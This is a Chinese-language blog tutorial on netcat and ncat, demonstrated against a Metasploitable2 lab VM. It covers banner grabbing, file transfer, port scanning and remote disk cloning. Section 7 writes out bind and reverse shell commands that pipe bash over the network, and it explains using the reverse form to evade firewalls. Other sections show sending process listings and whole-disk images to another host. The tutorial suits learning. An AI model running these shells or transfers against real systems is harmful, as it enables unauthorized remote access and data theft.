---
title: netcat
date: 2021-05-23 14:50:57
tags: 
      - 网络安全
      - 工具
categories: 
- [网络安全, 工具]
---

Netcat 常被称为网络工具中的瑞士军刀，以体积小（可执行 200KB）功能灵活而著称。

<!--more-->

> 不同系统平台的 nc 参数功能不尽相同

在 debian/ubuntu 下面：
```shell
readlink -f $(which nc)
```
看看，结果会有两种：
> - /bin/nc.traditional: 默认 GNU 基础版本，一般系统自带。
> - /bin/nc.openbsd: openbsd 版本，强大很多。

可以用 apt-get install nc-traditional 或者 apt-get install nc-openbsd 来选择安装。不管是 gnu 版本还是 openbsd 版本，都有新老的区别，主要是传送文件时 stdin 发生 EOF 了，老版本会自动断开，而新的 gnu/openbsd 还会一直连着。

语法
> nc [-hlnruz][-g<网关...>][-G<指向器数目>][-i<延迟秒数>][-o<输出文件>][-p<通信端口>][-s<来源位址>][-v...][-w<超时秒数>][主机名称][通信端口...]

参数说明
> - -g<网关> 设置路由器跃程通信网关，最多可设置8个。
> - -G<指向器数目> 设置来源路由指向器，其数值为4的倍数。
> - -h 在线帮助。
> - -i<延迟秒数> 设置时间间隔，以便传送信息及扫描通信端口。
> - -l 使用监听模式，管控传入的资料。
> - -n 直接使用IP地址，而不通过域名服务器。
> - -o<输出文件> 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
> - -p<通信端口> 设置本地主机使用的通信端口。
> - -r 乱数指定本地与远端主机的通信端口。
> - -s<来源位址> 设置本地主机送出数据包的IP地址。
> - -u 使用UDP传输协议。
> - -v 显示指令执行过程。
> - -w<超时秒数> 设置等待连线的时间。
> - -z 使用0输入/输出模式，只在扫描通信端口时使用。

## 1. telnet / banner 
查看 163 邮箱的 banner 信息
```shell
# 找到 163 邮箱的 ip 地址
$ ping pop3.163.com
PING pop3.163.idns.yeah.net (220.181.12.110) 56(84) bytes of data.
64 bytes from m12-110.163.com (220.181.12.110): icmp_seq=1 ttl=53 time=28.5 ms

# 使用 netcat 获取 banner
# pop3 协议默认端口110
$ nc -nv 220.181.12.110 110 
(UNKNOWN) [220.181.12.110] 110 (pop3) open
+OK Welcome to coremail Mail Pop3 Server (163coms[10774b260cc7a37d26d71b52404dcf5cs])
# 接下来可以输入账号密码登录邮箱进行操作

$ ping smtp.163.com
PING smtp.163.com (220.181.12.17) 56(84) bytes of data.
64 bytes from m12-17.163.com (220.181.12.17): icmp_seq=1 ttl=53 time=34.9 ms

# smtp 默认端口25
$ nc -nv 220.181.12.17 25  
(UNKNOWN) [220.181.12.17] 25 (smtp) open
220 163.com Anti-spam GT for Coremail System (163com[20141201])
```
- -v 显示命令执行过程中的详细信息
- -n 不作域名解析

> pop3 传入的数据需要进行 base64 编码：
> $ base64
> 输入需要进行 base64编码的文本
> ctrl + d 获得结果

通过 netcat 连接我的 metasploitable2（192.168.1.106）
```shell
$ nc -nv 192.168.1.106:80
(UNKNOWN) [192.168.1.106] 80 (http) open

# 获得 head 信息
head
<html><head><title>Metasploitable2 - Linux</title></head><body>
<pre>

                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


</pre>
<ul>
<li><a href="/twiki/">TWiki</a></li>
<li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
<li><a href="/mutillidae/">Mutillidae</a></li>
<li><a href="/dvwa/">DVWA</a></li>
<li><a href="/dav/">WebDAV</a></li>
</ul>
</body>
</html>
```

## 2. 传输文本信息
> 远程电子取证信息收集

通过 metasploitable2(192.168.1.106) 与 kali 两台虚机来演示

metasploitable2 上查看预使用的端口是否被占用：
```shell
sudo netstat -pantu | grep 333
```
无输出表明 333 端口未占用

metasploitable2 用 nc 监听 333端口：
```shell
sudo nc -l -p 333
```

kali 上使用 nc 连接 metasploitable2:
```shell
sudo nc -nv 192.168.1.106 333
(UNKNOWN) [192.168.1.106] 333 (?) open  
hello kali  # 传输文本。文本会传输至 metasploitable2，同样 matasploitable2 也可以传输文本至 kali
```

将 metasploitable2 上信息传至 kali(192.168.1.108)
```shell
# kali 上打开监听端口，并将内容存储到 ps.txt
$ sudo nc -l -p 333 > ps.txt

# metasploitable2 上将进程信息传输至 kali
# -q ： quit after EOF on stdin and delay of secs
$ ps aux | nc -nv 192.168.1.108 333 -q 1
```

## 3. 传输文件/目录
- 传输文件
  - A(接收端)：nc -lp 333 > 1.mp4    
  - B(发送端)：nc -nv 1.1.1.1 333 < 1.mp4 -q 1
  - 或
  - A(发送端)：nc -q 1 -lp 333 < a.mp4 -q 1
    - 等待其他人连接 333 端口下载 a.mp4 
  - B(接收端)： nc -nv 1.1.1.1 333 > 2.mp4
- 传输目录
  - A(发送端)：tar -cvf music/ | nc -lp 333 -q 1
    - 被动等接收 -cvf 打包
  - B：nc -nv 1.1.1.1 333 | tar -xvf  
    - -xvf 解包
- 加密传文件(利用系统的 mcrypt 加密)
  - A(接收端,解密)：nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4
    - mcrypt 解密，加密算法
    - 解密完成后 flush，本地不留缓存
  - B(发送端,加密)：mcrypt --flush -Fbq -a rijndael-256 -m ecb < a.mp4 | nc -nv 1.1.1.1 333 -q 1

## 4. 流媒体服务
- A(服务器)：cat 1.mp4 | nc -lp 333
- B(客户端)：nc -nv 1.1.1.1 333 | mplayer -vo xll -cache 3000 -
  - mplayer 媒体播放器(支持命令行)

## 5. 端口扫描
> 默认使用 tcp 去探测，探测到的也是 tcp 端口
> 每个扫描器不一定完全准确，可以多使用几款工具和方式来扫描
> nc 准确性没 nmap 等工具高，可作为参考

- nc -nvz 1.1.1.1 1-65535
  - tcp
- nc -nvzu 1.1.1.1 
  - udp（可能不准确）
  ```shell
  # 10.0.0.50 metasploitable2 ip地址，相当于前文的 192.168.1.106
  $ nc -nvz 10.0.0.50 1-65535
  (UNKNOWN) [10.0.0.50] 54951 (?) open
  (UNKNOWN) [10.0.0.50] 48585 (?) open
  (UNKNOWN) [10.0.0.50] 44601 (?) open
  (UNKNOWN) [10.0.0.50] 36467 (?) open
  (UNKNOWN) [10.0.0.50] 8787 (?) open
  (UNKNOWN) [10.0.0.50] 8180 (?) open
  (UNKNOWN) [10.0.0.50] 8009 (?) open
  (UNKNOWN) [10.0.0.50] 6697 (ircs-u) open
  (UNKNOWN) [10.0.0.50] 6667 (ircd) open
  (UNKNOWN) [10.0.0.50] 6000 (x11) open
  (UNKNOWN) [10.0.0.50] 5900 (?) open
  (UNKNOWN) [10.0.0.50] 5432 (postgresql) open
  (UNKNOWN) [10.0.0.50] 3632 (distcc) open
  (UNKNOWN) [10.0.0.50] 3306 (mysql) open
  (UNKNOWN) [10.0.0.50] 2121 (iprop) open
  (UNKNOWN) [10.0.0.50] 2049 (nfs) open
  (UNKNOWN) [10.0.0.50] 1524 (ingreslock) open
  (UNKNOWN) [10.0.0.50] 1099 (rmiregistry) open
  (UNKNOWN) [10.0.0.50] 514 (shell) open
  (UNKNOWN) [10.0.0.50] 513 (login) open
  (UNKNOWN) [10.0.0.50] 512 (exec) open
  (UNKNOWN) [10.0.0.50] 445 (microsoft-ds) open
  (UNKNOWN) [10.0.0.50] 139 (netbios-ssn) open
  (UNKNOWN) [10.0.0.50] 111 (sunrpc) open
  (UNKNOWN) [10.0.0.50] 80 (http) open
  (UNKNOWN) [10.0.0.50] 53 (domain) open
  (UNKNOWN) [10.0.0.50] 25 (smtp) open
  (UNKNOWN) [10.0.0.50] 23 (telnet) open
  (UNKNOWN) [10.0.0.50] 22 (ssh) open
  (UNKNOWN) [10.0.0.50] 21 (ftp) open
  ```

## 6. 远程克隆硬盘
> 操作系统上删除文件时，磁盘的磁头不会对每一位都初始化，只是在操作系统层删除(标记删除)，实际上硬盘上的每个扇区、每个磁道、每一位还是完整存在，所以删除的文件可以还原，除非被覆盖了。
> dd 硬盘块级别的备份，每一位是0还是1镜像复制

- A(接收端)：nc -lp 333 | dd of=/dev/sda
  - /dev/sda 挂的硬盘
- B(发送端)：dd if=/dev/sda | nc -nv 1.1.1.1 333 -q l

> 远程电子取证，可以将目标服务器硬盘远程复制

## 7. 远程控制
> nc 建立连接后，被控的可以是客户端，也可以是服务器端

- 正向
  - A(被控端)：nc -lp 333 -c bash
    - 将 bash 传到 333 端口
  - B(控制端)：nc -nv 1.1.1.1 333
  ```shell
  (metasploitable2) $ sudo nc -lp 333 -c bash

  (kali) $ nc -nv 1.1.1.1 333   
  (UNKNOWN) [10.0.0.50] 333 (?) open
  ls
  vulnerable
  pwd
  /home/msfadmin
  ```
- 反向
  - A(控制端)：nc -lp 333
  - B(被控端)：nc -nv 1.1.1.1 333 -c bash
> - windows 将 bash 改成 cmd
> - 可能由于防火墙等等原因，控制端(攻击方)连不上被控端(目标)，此时可以采用反向，让目标机主动来连攻击方。
> - 外向内限制 or 内向外限制
 
## 8. ncat
> - netcat 缺乏加密（明文传输）
> - netcat 缺乏身份验证能力

ncat 可以弥补 netcat 缺乏加密、身份验证的能力

ncat 包含于 nmap 工具包中

- A：ncat -c bash -allow 1.1.1.1 -vnl 333 -ssl
  - -allow 允许连接的 ip 地址
  - -ssl 加密方式 （整个管道都会加密）
- B：ncat -nv 1.1.1.1 333 --ssl
> 连接时会先交换 ssl fingerprint m

————————————————
- [用好你的瑞士军刀/netcat](https://zhuanlan.zhihu.com/p/83959309)
- [netcat 命令详解](https://segmentfault.com/a/1190000016626298)